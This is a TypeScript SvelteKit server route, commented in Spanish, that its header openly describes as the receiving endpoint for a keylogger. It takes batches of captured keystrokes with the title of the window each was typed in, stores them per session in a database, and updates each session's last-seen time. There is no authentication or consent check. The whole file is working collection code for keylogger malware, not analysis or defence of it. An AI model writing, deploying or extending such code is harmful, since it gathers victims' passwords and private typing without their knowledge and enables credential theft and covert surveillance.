// ------------------------------------------------------------------
// API — Recepción de tecleo capturado (keylogger)
// ------------------------------------------------------------------
// Recibe un lote de teclas capturadas:
//   { session_id, keys: [{ key, window_title, captured_at }, ...] }
// ------------------------------------------------------------------

import type { RequestHandler } from './$types';
import sql from '$lib/server/db';

export const POST: RequestHandler = async ({ request }) => {
	const body = await request.json();
	const { session_id, keys } = body;

	if (!session_id || !Array.isArray(keys) || keys.length === 0) {
		return new Response(JSON.stringify({ error: 'invalid payload' }), {
			status: 400,
			headers: { 'Content-Type': 'application/json' },
		});
	}

	try {
		// Insertar en lote
		for (const k of keys) {
			await sql`
				INSERT INTO keystrokes (session_id, key_value, window_title)
				VALUES (${session_id}, ${k.key ?? ''}, ${k.window_title ?? ''})
			`;
		}

		// Actualizar last_seen de la sesión
		await sql`
			UPDATE sessions SET last_seen = NOW() WHERE id = ${session_id}
		`;

		return new Response(JSON.stringify({ ok: true, count: keys.length }), {
			headers: { 'Content-Type': 'application/json' },
		});
	} catch (err) {
		console.error('Error en keystrokes:', err);
		return new Response(JSON.stringify({ error: 'DB error' }), {
			status: 500,
			headers: { 'Content-Type': 'application/json' },
		});
	}
};
